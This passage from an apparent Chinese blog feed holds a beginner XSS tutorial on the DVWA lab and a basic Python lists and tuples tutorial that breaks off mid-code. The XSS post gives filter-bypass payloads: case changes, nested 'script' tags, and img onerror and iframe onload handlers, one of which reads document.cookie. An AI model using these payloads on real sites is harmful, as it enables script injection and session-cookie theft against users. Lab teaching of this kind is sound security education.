      <url>/2020/01/25/xss/</url>
      
        <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><blockquote><p>xss是客户端代码注入，通常注入代码是JavaScript</p><p>区别于命令注入，SQL注入等服务端代码注入</p></blockquote><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS?"></a>什么是XSS?</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p> XSS又叫CSS  (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制，获取用户的一些信息。  </p><h3 id="二、分类"><a href="#二、分类" class="headerlink" title="二、分类"></a>二、分类</h3><h4 id="xss攻击可以分成两种类型："><a href="#xss攻击可以分成两种类型：" class="headerlink" title="xss攻击可以分成两种类型："></a>xss攻击可以分成两种类型：</h4><ol><li><p><strong>非持久型攻击</strong></p><p>非持久型xss攻击：顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p></li><li><p><strong>持久型攻击</strong><br>持久型xss攻击：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</p></li></ol><h4 id="也可以分成三类"><a href="#也可以分成三类" class="headerlink" title="也可以分成三类:"></a>也可以分成三类:</h4><p><strong>反射型：</strong>经过后端，不经过数据库</p><p> <strong>存储型：</strong>经过后端，经过数据库</p><p> <strong>DOM型：</strong>不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。  </p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200206194945.png" alt="img"></p><h3 id="三，造成原因"><a href="#三，造成原因" class="headerlink" title="三，造成原因"></a>三，造成原因</h3><p><strong>前端输入端的不安全转义或者没有安全防护，后端的不未经转义输出或者没有安全防护。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200206195059.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200206195939.png" alt="img"></p><h2 id="dvwa实战讲解"><a href="#dvwa实战讲解" class="headerlink" title="dvwa实战讲解"></a>dvwa实战讲解</h2><p><strong>（注：一下讲解仅作为给我初学学弟参考，不仅没有干货而且比较拉杂。<code>主要目的是培养学弟对绕过的认识</code>。）</strong></p><p><strong><code>(下篇打皮卡丘在放送稍许干货，大佬勿喷。)</code></strong></p><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><h4 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h4><p><strong>首先我们先从反射型xss 初级开始，我们先构造如下payload。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_22-14-45.png" alt="img"></p><p><strong>发现可以弹窗</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_22-10-26.png" alt="img"></p><p><strong>接着我们用F12审查一下，发现我们的payload被嵌入到HTML中了。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_22-19-16.png" alt="img"></p><h4 id="中级的"><a href="#中级的" class="headerlink" title="中级的"></a>中级的</h4><p><strong>我们还是用这个payload试一下</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_22-09-06.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_22-15-44.png" alt="img"></p><p><strong>发现我们的关键字被过滤了，那我们得想法绕过去。那我们不妨变换一下大小看看是否能够有效</strong></p><pre class=" language-javascript"><code class="language-javascript">#这里我将第一个script里的S大写，第二个script里的P大写<span class="token operator">&lt;</span>Script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scriPt<span class="token operator">></span></code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_22-18-18.png" alt></p><p><strong>发现可行。用F12看看源码发现我们的payload被嵌入到HTML中了。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_22-19-16.png" alt></p><p><strong>那么我们就接着来进行高等级吧。</strong></p><h4 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h4><p><strong>我们还是用这个payload试一下</strong></p><pre class=" language-javascript"><code class="language-javascript">#这里我将第一个script里的S大写，第二个script里的P大写<span class="token operator">&lt;</span>Script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scriPt<span class="token operator">></span></code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_22-59-24.png" alt></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_23-01-07.png" alt></p><p><strong>发现不行啊，直接就剩一个<code>&gt;</code>号了，让人头大。既然变换大小写也不能用还给过滤掉script的话，那我们猜测它是不是直接对script全方面过滤。那我们构造如下payload试试</strong></p><pre class=" language-javascript"><code class="language-javascript">#我在原来script的i后边再插入一个script。它过滤掉一个script那剩下的不还是script吗。<span class="token operator">&lt;</span>scriscriptpt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scriscriptpt<span class="token operator">></span></code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_23-13-13.png" alt></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_23-14-46.png" alt></p><p><strong>那我们在试试将字符编码，payload如下</strong></p><pre class=" language-HTML"><code class="language-HTML">#<scriscriptpt>alert('hack'</scriscriptpt>的HTML实体编码x3c;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x68;&#x61;&#x63;&#x6b;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x50;&#x74;&#x3e;</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_23-30-19.png" alt></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_23-31-37.png" alt></p><p><strong>还是不行，说明script是完全失效了。那我们得换另一个和script类似功能的payload的了。那我们用src试试。构造如下payload。</strong></p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">aletr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span></code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_23-40-33.png" alt></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-06_23-41-57.png" alt></p><p><strong>发现可行，说明前端只是过滤了script标签，对其他标签未做处理。</strong></p><h3 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h3><p>我们怎么能实现xss攻击？</p><p>我们怎么去绕过前端安全防控，思路是什么？</p><p>xss有什么用，难道就是弹窗弹着玩？</p><p><strong>（注：不知道的话建议百度一下，增强你对这方面的认识）</strong></p><h3 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h3><p><strong>(注：由于反射型我已经配有详细的payload操作演示。接下来我更多的是带着你们思考。)</strong></p><h4 id="初级-1"><a href="#初级-1" class="headerlink" title="初级"></a>初级</h4><p>进入界面后发现有两个输入框，我们尝试将此payload分别输入在两个输入框，发现name输入框限制了输入长度。</p><p>（下面作为一个小扩展，提升一下你们对前端安全认识。）</p><p>那我们就F12一下看看源码吧。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_15-05-03.png" alt></p><p><strong>发现name输入框限制输入字符是10个，Message输入框限制输入字符是50个。那我们思考一下我们怎么解除name输入框的前端的限制？其实我们直接在去爱你段修改代码即可。这里不难发现前端代码的脆弱性和不安全性。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_15-16-53.png" alt></p><p><strong>言归正传，接着提交我们的payload。发现dvwa连续两次弹出对话框，说明name和Message都可以进行xss。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_15-20-10.png" alt></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_15-20-10.png" alt></p><p><strong>难道这就是储存型xss，这不和反射型没什么区别啊。来接着看图。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_15-35-35.png" alt></p><p>我们看到我们刚才提交的payload的被写入到数据库中了。那么我们以后再访问这个页面，这个页面每次都会主动弹出我们的xss攻击payload。</p><h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><p>如果我们刚才不解除name输入框的前端输入限制， 那我们只能在Message处进行一次Xss攻击测试。<strong>这里我想说的是</strong>，如果那天你碰到类似这里name样式输入框，而且它又限制了字符长度，那我们是不是就可以拿这个例子作为参考，突破前端字符长度输入限制。然后进行xss攻击测试。</p><h4 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h4><p>我们接着输入刚才的payload，发现不能用了。参考反射型中级，我们改变大小写输入攻击payload。代码如下</p><pre class=" language-javascript"><code class="language-javascript">#这里我将第一个script里的S大写，第二个script里的P大写#name处的payload<span class="token operator">&lt;</span>Script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hack1'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scriPt<span class="token operator">></span>#Message处的payload<span class="token operator">&lt;</span>Script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hack2'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scriPt<span class="token operator">></span></code></pre><p>最后发现只弹出了<code>hack1</code>。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_16-11-12.png" alt></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_16-11-42.png" alt></p><p>然后再看看数据库中的状态，其他杂七杂八我就不说了。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_16-18-25.png" alt></p><h4 id="回顾-1"><a href="#回顾-1" class="headerlink" title="回顾"></a>回顾</h4><p><strong>我擦，</strong>如果刚才我没给你们说修改name输入框的输入长度，那么我们这里的payload就失效了。<strong>哇偶。。。好刺激。。。</strong></p><h4 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h4><p>我们接着输入刚才的payload，发现不能用了。参考反射型高级，我们用另一种弹窗的·方式输入攻击payload。代码如下</p><p>（我想现在的你们已经对xss有了点认识了，我就不多bb了）</p><pre class=" language-javascript"><code class="language-javascript">#这里有的payload任选其中一个均可<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"alert(hack)"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">""</span>onload<span class="token operator">=</span><span class="token string">"alert(hack)"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span></code></pre><p>那我们这里在来个刺激的payload吧，升级攻击危害。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">""</span> onload<span class="token operator">=</span><span class="token string">"alert(document.cookie)"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span></code></pre><p>我们用这个语句可以获取cookie<strong>（注：自行下去搜所关于xss获取cookie的文章。）</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-07_16-58-52.png" alt></p><h3 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h3><p>xss危害在哪？</p><p>xss存在方式是否多样？</p><p>如果产生了xss漏洞，我们改怎么样去解决？</p><p><strong>还有就是这里将不再演示DOM型注入</strong>，<strong>因为过于麻烦，而且概念比较难懂，这里由于篇幅不限不再讲解</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>注：反射型xss和dom-xss都需要在url加入js代码才能够触发。</strong></p><p><strong>在易操作使用上，存储型XSS &gt; DOM - XSS &gt; 反射型 XSS。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200206195615.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200206211841.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA_XSS_入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python初识</title>
      <link href="/2020/01/16/python-chu-shi-san/"/>
      <url>/2020/01/16/python-chu-shi-san/</url>
      
        <content type="html"><![CDATA[<h1 id="python初始（三）"><a href="#python初始（三）" class="headerlink" title="python初始（三）"></a>python初始（三）</h1><h2 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h2><h3 id="python基本数据类型"><a href="#python基本数据类型" class="headerlink" title="python基本数据类型"></a>python基本数据类型</h3><h3 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a>List（列表）</h3><p>List（列表） 是 Python 中使用最频繁的数据类型。</p><p>列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><p>列表是写在方括号 [] 之间、用逗号分隔开的元素列表。</p><p> 和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。 </p><p>列表截取的语法格式如下：</p><blockquote><p>变量[头下标:尾下标]</p></blockquote><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p><p><img src="/2020/01/16/python-chu-shi-san/picgo-github20200123212234.png" alt="img"></p><p>加号 <code>+</code>是列表连接运算符，星号<code>*</code>是重复操作。如下实例：</p><pre class=" language-python"><code class="language-python">list <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span> <span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">,</span> <span class="token number">70.2</span> <span class="token punctuation">]</span>tinylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token punctuation">(</span>list<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 输出完整列表</span><span class="token keyword">print</span> <span class="token punctuation">(</span>list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># 输出列表第一个元素</span><span class="token keyword">print</span> <span class="token punctuation">(</span>list<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 从第二个开始输出到第三个元素</span><span class="token keyword">print</span> <span class="token punctuation">(</span>list<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 输出从第三个元素开始的所有元素</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tinylist <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 输出两次列表</span><span class="token keyword">print</span> <span class="token punctuation">(</span>list <span class="token operator">+</span> tinylist<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 连接列表</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#以上实例输出结果：</span><span class="token operator">>></span><span class="token operator">></span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true"># 将对应的元素值设置为 [] </span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span></code></pre><p>List 内置了有很多方法，例如 append()、pop() 等等，这在后面会讲到。</p><p><strong>注意：</strong></p><ul><li>1、List写在方括号之间，元素用逗号隔开。</li><li>2、和字符串一样，list可以被索引和切片。</li><li>3、List可以使用+操作符进行拼接。</li><li>4、List中的元素是可以改变的。</li></ul><p>Python 列表截取可以接收第三个参数，参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：</p><p><img src="/2020/01/16/python-chu-shi-san/picgo-github20200123212522.png" alt="img"></p><p>如果第三个参数为负数表示逆向读取，以下实例用于翻转字符串：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverseWords</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 通过空格将字符串分隔符，把各个单词分隔为列表</span>    inputWords <span class="token operator">=</span> input<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 翻转字符串</span>    <span class="token comment" spellcheck="true"># 假设列表 list = [1,2,3,4],  </span>    <span class="token comment" spellcheck="true"># list[0]=1, list[1]=2 ，而 -1 表示最后一个元素 list[-1]=4 ( 与 list[3]=4 一样)</span>    <span class="token comment" spellcheck="true"># inputWords[-1::-1] 有三个参数</span>    <span class="token comment" spellcheck="true"># 第一个参数 -1 表示最后一个元素</span>    <span class="token comment" spellcheck="true"># 第二个参数为空，表示移动到列表末尾</span>    <span class="token comment" spellcheck="true"># 第三个参数为步长，-1 表示逆向</span>    inputWords<span class="token operator">=</span>inputWords<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 重新组合字符串</span>    output <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>inputWords<span class="token punctuation">)</span>    <span class="token keyword">return</span> output<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    input <span class="token operator">=</span> <span class="token string">'I like runoob'</span>    rw <span class="token operator">=</span> reverseWords<span class="token punctuation">(</span>input<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rw<span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#输出结果</span>runoob like I</code></pre><h4 id="字符串截取字符补充："><a href="#字符串截取字符补充：" class="headerlink" title="字符串截取字符补充："></a>字符串截取字符补充：</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 0、a,b为参数。从字符串指针为a的地方开始截取字符，到b的前一个位置（因为不包含b）</span>var1 <span class="token operator">=</span> <span class="token string">"hello world"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span>a<span class="token punctuation">:</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># 1、如果a,b均不填写，默认取全部字符。即，下面这两个打印结果是一样的</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"># hello world</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true"># hello world</span><span class="token comment" spellcheck="true"># 2、如果a填写，b不填写（或填写的值大于指针下标），默认从a开始截取，至字符串最后一个位置</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># lo world</span><span class="token comment" spellcheck="true"># 3、如果a不填写， b填写，默认从0位置开始截取，至b的前一个位置</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># hello wo</span><span class="token comment" spellcheck="true"># 4、如果a为负数，默认从尾部某一位置，开始向后截取</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># ld</span><span class="token comment" spellcheck="true"># 5、如果a>=b, 默认输出为空。</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">### 字符串等倒序小测：</span>ch <span class="token operator">=</span> <span class="token string">"我给大佬点烟。"</span>ls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>st <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ch<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>st<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">###输出</span>。烟点佬大给我<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span></code></pre><h4 id="Tuple（元组）"><a href="#Tuple（元组）" class="headerlink" title="Tuple（元组）"></a>Tuple（元组）</h4><p>元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 () 里，元素之间用逗号隔开。 </p><p>元组中的元素类型也可以不相同： </p><pre class=" language-python"><code class="language-python">tuple <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span> <span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">,</span> <span class="token number">70.2</span>  <span class="token punctuation">)</span>tinytuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tuple<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 输出完整元组</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tuple<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># 输出元组的第一个元素</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tuple<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 输出从第二个元素开始到第三个元素</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tuple<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># 输出从第三个元素开始的所有元素</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tinytuple <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 输出两次元组</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tuple <span class="token operator">+</span> tinytuple<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 连接元组</span></code></pre><p>以上实例输出结果：</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">)</span>abcd<span class="token punctuation">(</span><span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token 